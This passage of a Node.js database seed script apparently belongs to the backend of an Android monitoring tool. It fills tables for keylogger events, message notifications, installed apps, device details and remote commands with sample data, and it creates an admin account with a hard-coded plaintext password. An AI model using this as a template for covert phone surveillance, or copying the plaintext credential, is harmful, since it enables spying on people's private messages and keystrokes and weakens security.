      is_function_pressed: 0,
      is_caps_lock_on: 0,
      is_num_lock_on: 0,
      is_scroll_lock_on: 0,
      device_id: null, // This will be set for each device
      event_time: nowMinus(5),
      created_at: new Date()
    },
    {
      package_name: 'com.android.chrome',
      activity_name: 'com.google.android.apps.chrome.Main',
      key_event: 'key_down',
      key_code: 67, // BACKSPACE key
      key_character: '\b',
      meta_state: 4096, // META_CTRL_ON
      is_shift_pressed: 0,
      is_alt_pressed: 0,
      is_ctrl_pressed: 1, // Ctrl+Backspace
      is_function_pressed: 0,
      is_caps_lock_on: 0,
      is_num_lock_on: 0,
      is_scroll_lock_on: 0,
      device_id: null, // This will be set for each device
      event_time: nowMinus(2),
      created_at: new Date()
    }
  ];

  for (const d of devices) {
    for (const log of keylogs) {
      try {
        const logEntry = { ...log };
        logEntry.device_id = d.device_id; // Use the string device_id
        logEntry.updated_at = new Date();
        await qi.bulkInsert('device_keylogger', [logEntry], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting keylogger data for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Keylogger data inserted: ${successCount}`);
  } else {
    console.warn('[seed] No keylogger data was inserted. Check the keylogger_data table schema.');
  }
}

async function seedNotifications(devices) {
  const qi = sequelize.getQueryInterface();
  let successCount = 0;
  
  // Check if table exists first
  const tables = await qi.showAllTables();
  const tableName = 'device_notifications';
  const tableExists = tables.some(t => 
    (typeof t === 'string' && t === tableName) ||
    (typeof t === 'object' && t.tableName === tableName)
  );

  if (!tableExists) {
    console.warn(`[seed] Table ${tableName} does not exist. Skipping notifications seeding.`);
    return;
  }

  for (const d of devices) {
    const notifications = [
      {
        device_id: d.id, // Use the UUID from the device
        package_name: 'com.whatsapp',
        notification_id: `NOTIF-${d.device_id}-${Date.now()}-1`,
        tag: 'group1',
        title: 'New message',
        text: 'John: Hey, are we still meeting today?',
        subtext: 'Tap to reply',
        info_text: '1 unread message',
        summary_text: '1 new message',
        large_icon: 'https://example.com/avatars/john.jpg',
        small_icon: 'ic_notification',
        picture: null,
        extras: JSON.stringify({ 
          conversation: true,
          message_count: 1,
          sender: 'John',
          group_id: 'grp123'
        }),
        priority: 0,
        category: 'msg',
        group_key: 'group1',
        sort_key: 'msg123',
        is_clearable: true,
        is_ongoing: false,
        is_group_summary: false,
        is_local_only: false,
        when: nowMinus(25),
        timeout_after: 60000,
        post_time: new Date(),
        created_at: new Date()
      },
      {
        device_id: d.id, // Use the UUID from the device
        package_name: 'com.android.email',
        notification_id: `NOTIF-${d.device_id}-${Date.now()}-2`,
        tag: 'email123',
        title: 'New email from GitHub',
        text: 'Pull request #123 was merged',
        subtext: 'GitHub',
        info_text: '1 unread email',
        summary_text: '1 new email',
        large_icon: null,
        small_icon: 'ic_email_notification',
        picture: null,
        extras: JSON.stringify({ 
          email_id: 'email123',
          account: 'user@example.com',
          is_important: true
        }),
        priority: 1,
        category: 'email',
        group_key: 'email_group',
        sort_key: 'email123',
        is_clearable: true,
        is_ongoing: false,
        is_group_summary: false,
        is_local_only: false,
        when: nowMinus(10),
        timeout_after: null,
        post_time: new Date(),
        created_at: new Date()
      }
    ];

    for (const notif of notifications) {
      try {
        await qi.bulkInsert('device_notifications', [notif], { ignoreDuplicates: true });
        successCount++;
      } catch (error) {
        console.warn(`[seed] Error inserting notification for device ${d.device_id}:`, error.message);
      }
    }
  }

  if (successCount > 0) {
    console.log(`[seed] Notifications inserted: ${successCount}`);
    console.warn('[seed] No notifications were inserted. Check the device_notifications table schema.');
  }
}

/**
 * Seed admin user
 */
async function seedAdmin(transaction = null) {
  try {
    logger.info('[seed] Seeding admin user...');
    
    // Check if admin already exists
    const existingAdmin = await User.findOne({
      where: { email: 'admin@example.com' },
      transaction
    });
    
    if (existingAdmin) {
      logger.info('[seed] Admin user already exists');
      return existingAdmin;
    }
    
    // Create admin user
    const admin = await User.create({
      username: 'admin',
      email: 'admin@hawkshaw.com',
      password: 'Admin@1234', // In production, this should be hashed
      role: 'admin',
      is_active: true,
      email_verified: true,
      last_login: new Date(),
      created_at: new Date(),
      updated_at: new Date()
    }, { transaction });
    
    logger.info('[seed] Admin user created successfully');
    return admin;
  } catch (error) {
    logger.error('[seed] Error seeding admin user:', error);
    throw error;
  }
}

/**
 * Seed app installations for devices
 */
async function seedAppInstallations(devices, transaction = null) {
  try {
    logger.info('[seed] Seeding app installations...');
    
    if (!AppInstallation) {
      logger.warn('[seed] AppInstallation model not available. Skipping app installations.');
      return [];
    }
    
    // Common Android apps with realistic data
    const appPackages = [
      // Social Media
      {
        package_name: 'com.whatsapp',
        app_name: 'WhatsApp',
        version_name: '2.22.25.81',
        version_code: 234214010,
        install_time: nowMinus(30 * 24 * 60), // 30 days ago
        update_time: nowMinus(7 * 24 * 60),   // 7 days ago
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      },
      {
        package_name: 'com.facebook.katana',
        app_name: 'Facebook',
        version_name: '400.0.0.28.119',
        version_code: 4000028119,
        install_time: nowMinus(60 * 24 * 60), // 60 days ago
        update_time: nowMinus(14 * 24 * 60),  // 14 days ago
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      },
      // Google Apps
      {
        package_name: 'com.google.android.gm',
        app_name: 'Gmail',
        version_name: '2022.11.06.484975143',
        version_code: 484975143,
        install_time: nowMinus(90 * 24 * 60), // 90 days ago
        update_time: nowMinus(5 * 24 * 60),   // 5 days ago
        is_system_app: true,
        is_enabled: true,
        is_launcher: true
      },
      {
        package_name: 'com.google.android.youtube',
        app_name: 'YouTube',
        version_name: '17.45.36',
        version_code: 1541543206,
        install_time: nowMinus(45 * 24 * 60),
        update_time: nowMinus(3 * 24 * 60),
        is_system_app: true,
        is_enabled: true,
        is_launcher: true
      },
      // Communication
      {
        package_name: 'com.instagram.android',
        app_name: 'Instagram',
        version_name: '250.0.0.21.109',
        version_code: 2500021109,
        install_time: nowMinus(20 * 24 * 60),
        update_time: nowMinus(2 * 24 * 60),
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      },
      // Browsers
      {
        package_name: 'com.android.chrome',
        app_name: 'Chrome',
        version_name: '107.0.5304.105',
        version_code: 530410533,
        install_time: nowMinus(100 * 24 * 60),
        update_time: nowMinus(1 * 24 * 60),
        is_system_app: true,
        is_enabled: true,
        is_launcher: true
      },
      // Shopping
      {
        package_name: 'com.amazon.mShop.android.shopping',
        app_name: 'Amazon Shopping',
        version_name: '24.7.0.100',
        version_code: 247000100,
        install_time: nowMinus(15 * 24 * 60),
        update_time: nowMinus(4 * 24 * 60),
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      },
      // Food Delivery
      {
        package_name: 'com.ubercab.eats',
        app_name: 'Uber Eats',
        version_name: '7.45.10001',
        version_code: 74510001,
        install_time: nowMinus(10 * 24 * 60),
        update_time: nowMinus(1 * 24 * 60),
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      },
      // Navigation
      {
        package_name: 'com.google.android.apps.maps',
        app_name: 'Google Maps',
        version_name: '11.67.1',
        version_code: 116701124,
        install_time: nowMinus(80 * 24 * 60),
        update_time: nowMinus(2 * 24 * 60),
        is_system_app: true,
        is_enabled: true,
        is_launcher: true
      },
      // Music
      {
        package_name: 'com.spotify.music',
        app_name: 'Spotify',
        version_name: '8.7.78.1211',
        version_code: 8781211,
        install_time: nowMinus(25 * 24 * 60),
        update_time: nowMinus(1 * 24 * 60),
        is_system_app: false,
        is_enabled: true,
        is_launcher: true
      }
    ];
    
    const installations = [];
    
    for (const device of devices) {
      for (const app of appPackages) {
        try {
          const [installation] = await AppInstallation.upsert(
            {
              device_id: device.device_id,
              package_name: app.package_name,
              app_name: app.app_name,
              version_name: app.version_name,
              version_code: app.version_code,
              install_time: app.install_time,
              update_time: app.update_time,
              is_system_app: app.is_system_app,
              is_enabled: app.is_enabled,
              is_launcher: app.is_launcher,
              created_at: new Date(),
              updated_at: new Date()
            },
            {
              where: { 
                device_id: device.device_id,
                package_name: app.package_name 
              },
              transaction
            }
          );
          
          installations.push(installation);
        } catch (error) {
          logger.error(`[seed] Error seeding app installation ${app.package_name} for device ${device.device_id}:`, error.message);
        }
      }
    }
    
    logger.info(`[seed] Seeded ${installations.length} app installations`);
    return installations;
  } catch (error) {
    logger.error('[seed] Error seeding app installations:', error);
    throw error;
  }
}

/**
 * Seed dynamic configurations
 */
async function seedDynamicConfigs(transaction = null) {
  try {
    logger.info('[seed] Seeding dynamic configurations...');
    
    if (!DynamicConfig) {
      logger.warn('[seed] DynamicConfig model not available. Skipping dynamic configs.');
      return [];
    }
    
    const configs = [
      {
        key: 'location_update_interval',
        value: '300', // 5 minutes in seconds
        description: 'Interval in seconds between location updates',
        is_active: true,
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        key: 'battery_saver_mode',
        value: 'false',
        description: 'Enable battery saver mode',
        is_active: false,
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        key: 'max_upload_size_mb',
        value: '10',
        description: 'Maximum file upload size in MB',
        is_active: true,
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        key: 'auto_update_enabled',
        value: 'true',
        description: 'Enable automatic app updates',
        is_active: true,
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        key: 'data_sync_interval',
        value: '900', // 15 minutes in seconds
        description: 'Interval in seconds for syncing data with server',
        is_active: true,
        created_at: new Date(),
        updated_at: new Date()
      }
    ];
    
    const createdConfigs = [];
    
    for (const config of configs) {
      try {
        const [created] = await DynamicConfig.upsert(
          {
            ...config,
            updated_at: new Date()
          },
          {
            where: { key: config.key },
            transaction
          }
        );
        
        createdConfigs.push(created);
      } catch (error) {
        logger.error(`[seed] Error seeding config ${config.key}:`, error.message);
      }
    }
    
    logger.info(`[seed] Seeded ${createdConfigs.length} dynamic configurations`);
    return createdConfigs;
  } catch (error) {
    logger.error('[seed] Error seeding dynamic configurations:', error);
    throw error;
  }
}

/**
 * Seed test devices
 */
async function seedDevices(transaction = null) {
  try {
    logger.info('[seed] Seeding test devices...');
    
    // Check if devices already exist
    const existingDevices = await Device.findAll({ 
      limit: 2,
      transaction 
    });
    
    if (existingDevices.length >= 2) {
      logger.info('[seed] Test devices already exist');
      return existingDevices;
    }
    
    // Create test devices
    const testDevices = [
      {
        device_id: `TEST-DEVICE-${crypto.randomBytes(8).toString('hex').toUpperCase()}`,
        device_name: 'Test Device 1',
        model: 'Pixel 6',
        manufacturer: 'Google',
        android_version: '13',
        api_level: 33,
        imei: `35${Math.floor(10000000000000 + Math.random() * 90000000000000)}`,
        phone_number: `+1${Math.floor(2000000000 + Math.random() * 8000000000)}`,
        status: 'online',
        last_seen: new Date(),
        registration_date: new Date(),
        is_active: true,
        app_version: '1.0.0',
        battery_level: 85,
        is_charging: true,
        network_type: 'wifi',
        ip_address: '192.168.1.100',
        location_enabled: true,
        camera_enabled: true,
        microphone_enabled: true,
        created_at: new Date(),
        updated_at: new Date()
      },
      {
        device_id: `TEST-DEVICE-${crypto.randomBytes(8).toString('hex').toUpperCase()}`,
        device_name: 'Test Device 2',
        model: 'Galaxy S22',
        manufacturer: 'Samsung',
        android_version: '13',
        api_level: 33,
        imei: `35${Math.floor(10000000000000 + Math.random() * 90000000000000)}`,
        phone_number: `+1${Math.floor(2000000000 + Math.random() * 8000000000)}`,
        status: 'offline',
        last_seen: nowMinus(60), // 1 hour ago
        registration_date: nowMinus(24 * 60), // 1 day ago
        is_active: true,
        app_version: '1.0.0',
        battery_level: 42,
        is_charging: false,
        network_type: 'mobile',
        ip_address: '10.0.0.5',
        location_enabled: false,
        camera_enabled: false,
        microphone_enabled: false,
        created_at: nowMinus(24 * 60), // 1 day ago
        updated_at: nowMinus(60) // 1 hour ago
      }
    ];
    
    const createdDevices = await Device.bulkCreate(testDevices, { 
      returning: true,
      transaction 
    });
    
    logger.info(`[seed] Created ${createdDevices.length} test devices`);
    return createdDevices;
  } catch (error) {
    logger.error('[seed] Error seeding test devices:', error);
    throw error;
  }
}

/**
 * Main seed function
 */
async function seed() {
  const transaction = await sequelize.transaction();
  
  try {
    // Initialize database connection
    await sequelize.authenticate();
    logger.info('Database connection has been established successfully.');
    
    // Sync all models with transaction, but skip the app_installations table for now
    await sequelize.sync({ 
      force: false,
      transaction,
      logging: (msg) => logger.debug(`[Sequelize Sync] ${msg}`),
      skip: ['app_installations']
    });
    
    // Manually sync the app_installations table to avoid duplicate column issues
    const appInstallationsTableExists = await tableExists('app_installations');
    if (!appInstallationsTableExists) {
      await AppInstallation.sync({ transaction });
    } else {
      // Check if the app_update_id column exists
      const [columns] = await sequelize.query(
        "SHOW COLUMNS FROM `app_installations`",
        { transaction }
      );
      
      const columnNames = columns.map(col => col.Field);
      const appUpdateIdColumn = columns.find(col => col.Field === 'app_update_id');
      
      // Check if the foreign key constraint already exists
      const [constraints] = await sequelize.query(
        `SELECT * FROM information_schema.TABLE_CONSTRAINTS 
         WHERE TABLE_SCHEMA = '${sequelize.config.database}' 
         AND TABLE_NAME = 'app_installations' 
         AND CONSTRAINT_NAME = 'app_installations_app_update_id_foreign_idx'`,
        { transaction }
      );
      
      // Add the column if it doesn't exist
      if (!appUpdateIdColumn) {
        await sequelize.query(
          'ALTER TABLE `app_installations` ADD `app_update_id` CHAR(36) BINARY',
          { transaction }
        );
      }
      
      // Add the foreign key constraint if it doesn't exist
      if (constraints.length === 0) {
        await sequelize.query(
          'ALTER TABLE `app_installations` ' +
          'ADD CONSTRAINT `app_installations_app_update_id_foreign_idx` ' +
          'FOREIGN KEY (`app_update_id`) REFERENCES `app_updates` (`id`) ' +
          'ON DELETE SET NULL ON UPDATE CASCADE',
          { transaction }
        );
      }
    }
    
    logger.info('=== Starting database seeding ===');
    
    // Seed admin user
    await seedAdmin(transaction);
    
    // Seed test devices
    const devices = await seedDevices(transaction);
    
    // Seed locations for each device
    for (const device of devices) {
      await seedLocations(device, 20, transaction);
    }
    
    // Seed media files for each device
    for (const device of devices) {
      await seedMedia(device, 10, transaction);
    }
    
    // Seed contacts for each device
    for (const device of devices) {
      await seedContacts(device, 15, transaction);
    }
    
    // Seed SMS messages for each device
    for (const device of devices) {
      await seedSMS(device, 20, transaction);
    }
    
    // Seed call logs for each device
    for (const device of devices) {
      await seedCallLogs(device, 15, transaction);
    }
    
    // Seed device info for each device
    for (const device of devices) {
      await seedDeviceInfo(device, transaction);
    }
    
    // Seed app updates
    await seedAppUpdates(devices, transaction);
    
    // Seed app installations for each device
    await seedAppInstallations(devices, transaction);
    
    // Seed dynamic configurations
    await seedDynamicConfigs(transaction);
    
    // Seed browser history for each device
    await seedBrowserHistory(devices, transaction);
    
    // Seed bookmarks for each device
    await seedBookmarks(devices, transaction);
    
    // Seed clipboard data for each device
    await seedClipboard(devices, transaction);
    
    // Seed keylogger data for each device
    await seedKeylogger(devices, transaction);
    
    // Seed notifications for each device
    await seedNotifications(devices, transaction);
    
    // Seed commands for each device
    for (const device of devices) {
      await seedCommands(device, 5, transaction);
    }
    
    // Commit the transaction if we get here
    await transaction.commit();
    logger.info('=== Database seeding completed successfully ===');
    return true;
  } catch (error) {
    // If we get here, something went wrong, so we roll back the transaction
    try {
      await transaction.rollback();
      logger.error('[seed] Transaction rolled back due to error');
    } catch (rollbackError) {
      logger.error('[seed] Error rolling back transaction:', rollbackError);
    }
    
    logger.error('[seed] Error during seeding:', error);
    if (process.env.NODE_ENV === 'development') {
      logger.error(error.stack);
    }
    
    // Re-throw the error to be caught by the outer try-catch
    throw error;
  }
}

if (require.main === module) {
  seed();
}

module.exports = {
  seed,
  seedAdmin,
  seedDevices,
  seedLocations,
  seedMedia,
  seedContacts,
  seedSMS,
  seedCallLogs,
  seedAppUpdates,
  seedDeviceInfo,
  seedCommands,
  seedAppInstallations,
  seedDynamicConfigs,
  seedBrowserHistory,
  seedBookmarks,
  seedClipboard,
  seedKeylogger,
  seedNotifications
};
